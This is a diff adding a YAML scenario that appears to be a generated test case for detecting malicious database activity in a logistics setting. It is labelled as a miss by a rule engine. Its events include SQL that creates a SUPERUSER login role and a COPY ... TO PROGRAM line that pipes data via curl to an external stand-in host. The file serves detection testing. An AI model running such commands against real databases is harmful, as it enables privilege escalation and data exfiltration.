@@ -1,0 +1,23 @@
+scenario_id: gen_logistics_17_data_tamper_mal_395
+family_id: gen_logistics_17_data_tamper_mal_fam395
+domain: logistics
+time_of_day: 02:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: dispatcher
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: CREATE ROLE svc_916341 SUPERUSER LOGIN PASSWORD 'x557729'
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://clearinghouse-batch.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.80.24.226
+      port: 445
